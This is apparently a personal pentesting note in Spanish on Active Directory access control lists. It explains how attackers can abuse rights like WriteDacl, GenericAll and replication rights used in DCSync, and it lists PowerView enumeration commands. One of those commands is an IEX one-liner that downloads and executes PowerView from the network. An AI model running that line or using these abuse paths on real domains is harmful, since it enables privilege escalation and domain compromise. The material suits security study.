# Lista de control de acceso 

Tags: #AD #ACL #PowerView 

## Análisis del ACE

```bash 
1. ObjectDN: Especifica el objeto sobre el cual se aplican los derechos. Aquí, 'CN=FIRST-DC,OU=Domain Controllers,DC=domain1,DC=corp' indica que el objeto es el controlador de dominio 'FIRST-DC' dentro del dominio 'domain1.corp'.
    
2. ActiveDirectoryRights: WriteDac
    - 'WriteDacl' significa "Write Discretionary Access Control List" (escribir en la lista de control de acceso discrecional). Este derecho permite al usuario 'writedacldc.user' modificar la DACL del objeto 'FIRST-DC'.
    - La DACL es parte de la seguridad de un objeto y define quién tiene qué permisos sobre dicho objeto.
        
3. SecurityIdentifier e IdentityReference
    - El 'SecurityIdentifier' ('S-1-5-21-1861162130-2580302541-221646211-1124') y 'IdentityReference' ('writedacldc.user') identifican al usuario que tiene este derecho.

## Abusos por un Atacante ## 
Nota: Si un atacante compromete la cuenta 'writedacldc.user', podría abusar del derecho 'WriteDacl' de varias maneras:

1. Modificación de Permisos
    - El atacante podría modificar los permisos del controlador de dominio 'FIRST-DC' para otorgar derechos adicionales a otros usuarios o cuentas controladas por el atacante. Esto podría incluir otorgar derechos de administrador o permisos para realizar acciones críticas.
```

## Tipos de permisos 

```bash 
1. GenericAll
- Derechos totales sobre el objeto.
- Uso por un atacante**: Este permiso otorga control total sobre un objeto. Un atacante podría agregar usuarios a grupos, restablecer contraseñas o modificar cualquier aspecto del objeto en cuestión.

2. GenericWrite
- Actualización de los atributos del objeto.
- Uso por un atacante: Con este permiso, un atacante podría cambiar atributos críticos de un objeto, como el script de inicio de sesión, lo que podría utilizarse para ejecutar comandos maliciosos cuando los usuarios inicien sesión.

3. WriteOwner
- Cambiar el propietario del objeto a un usuario controlado por el atacante.
- Uso por un atacante: Al cambiar el propietario de un objeto a una cuenta que controla, el atacante puede asumir todos los derechos sobre dicho objeto, permitiéndole modificarlo a voluntad o incluso eliminarlo.

4. WriteDACL
- Modificar las ACEs (Entradas de Control de Acceso) del objeto y darle al atacante plenos derechos sobre el objeto.
- Uso por un atacante: Este permiso permite a un atacante alterar las ACLs del objeto, dándose a sí mismo más permisos y, potencialmente, obtener control completo sobre él.

5. AllExtendedRights
- Capacidad de añadir usuarios a un grupo o restablecer contraseñas.
- Uso por un atacante: Los derechos extendidos incluyen acciones críticas como añadir un usuario a un grupo administrativo o restablecer la contraseña de cualquier usuario, lo cual podría ser abusado para escalar privilegios o tomar control de cuentas.

6. ForceChangePassword
- Capacidad de cambiar la contraseña de un usuario.
- Uso por un atacante: Este permiso permite al atacante cambiar la contraseña de un usuario sin conocer la contraseña actual, lo que podría usarse para comprometer cuentas sin alertar al usuario legítimo.

7. Self (Self-Membership)
- Capacidad de añadirse a uno mismo a un grupo.
- Uso por un atacante: Si un atacante puede otorgarse a sí mismo la membresía a un grupo privilegiado, puede elevar sus privilegios dentro del entorno de AD.
```

## Tabla de Referencia de Permisos y Derechos en Active Directory

| Derecho en AD                  | Valor de Permiso/GUID                     | Tipo de Permiso                       | Descripción Breve                                                                                                 |
| ------------------------------ | ----------------------------------------- | ------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| WriteDacl                      | `ADS_RIGHT_WRITE_DAC` (0x40000)           | Access Right                          | Permite modificar la DACL (lista de control de acceso discrecional) del objeto.                                   |
| GenericAll                     | `ADS_RIGHT_GENERIC_ALL` (0x10000000)      | Access Right                          | Proporciona control total sobre el objeto, incluyendo la modificación de permisos.                                |
| GenericWrite                   | `ADS_RIGHT_GENERIC_WRITE` (0x40000000)    | Access Right                          | Permite realizar cambios en las propiedades del objeto, pero no cambiar permisos ni borrar el objeto.             |
| WriteProperty                  | `ADS_RIGHT_DS_WRITE_PROP` (0x20)          | Access Right                          | Permite modificar las propiedades de un objeto.                                                                   |
| WriteOwner                     | `ADS_RIGHT_WRITE_OWNER` (0x80000)         | Access Right                          | Permite cambiar el propietario de un objeto.                                                                      |
| Self                           | No aplica/GUID específico de la operación | Access Right                          | Permite a un usuario modificar sus propios atributos o pertenencia a ciertos grupos.                              |
| AllExtendedRights              | `ADS_RIGHT_DS_CONTROL_ACCESS` (0x100)     | Access Right                          | Otorga todos los derechos extendidos, como cambiar contraseñas o leer propiedades no replicadas.                  |
| User-Force-Change-Password     | {00299570-246d-11d0-a768-00aa006e0529}    | Control Access Right (extended right) | Permite forzar el cambio de contraseña de otro usuario.                                                           |
| DS-Replication-Get-Changes     | {1131f6ae-9c07-11d1-f79f-00c04fc2dcd2}    | Control Access Right (extended right) | Permite sincronizar cambios de datos de AD (usado en ataques DCSync).                                             |
| DS-Replication-Get-Changes-All | {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}    | Control Access Right (extended right) | Permite ver todos los cambios, incluyendo versiones anteriores y eliminadas de objetos (usado en ataques DCSync). |
| Self-Membership                | bf9679c0-0de6-11d0-a285-00aa003049e2      | Validate Write                        | Permite a un usuario modificar su propia pertenencia a ciertos grupos.                                            |
| Validated-SPN                  | f3a64788-5306-11d1-a9c5-0000f80367c1      | Validate Write                        | Permite a un servicio agregar o modificar el atributo Service Principal Name (SPN) de su propio objeto de cuenta. |

## Access Control Entry (ACE)

```bash
- Definición: Un ACE es un elemento individual en una lista de control de acceso (ACL). Define los permisos para un usuario, grupo u objeto específico.
- Contenido: Un ACE especifica qué operaciones (como leer, escribir, ejecutar) están permitidas o denegadas para un objeto y quién puede realizar esas operaciones.
- Ejemplo: Un ACE podría indicar que el usuario "John Doe" tiene permiso para leer y escribir en un archivo específico.


## Diferencias Clave de ACL y ACE ##
- Granularidad: Un ACE es un elemento individual que define permisos para un sujeto específico, mientras que una ACL es un conjunto de varios ACEs asociados a un objeto.
- Aplicación: Los ACEs son las reglas individuales, y la ACL es la lista completa de esas reglas aplicadas a un objeto.
```

## Enumeración con PowerView

```powershell
# Descargar el binario desde un repositorio 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');
```

```powershell 
❯ Get-ObjectAcl Object-Name -ResolveGUIDs
❯ Find-InterestingDomainAcl

❯ Get-ObjectAcl | select AceType,SecurityIdentifier,ActiveDirectoryRights,ObjectDN | Format-List 

Nota: En los ACE podemos encontrar este tipo de identificadores:
	# SID cortas 'S-1-5-9' = Grupos por defecto en AD
	# SID medianas 'S-1-5-32-557' = Grupos de Operadores 
	# SID largas 'S-1-5-21-1861162130-2580302541-221646211-1124' = Pertenece a un usuario 

❯ Convert-SidToName SID      # Convierte el numero SID al nombre que le pertenece 
```

```powershell 
❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier)}

	# % = Es un bucle como 'foreach'
	# $_ = Objetos que tenemos por 'detras' 
	# $ = Ejecutaremos un comando
	# $_. = Llamamos a un atributo en este caso a 'Security-Identifier'
```

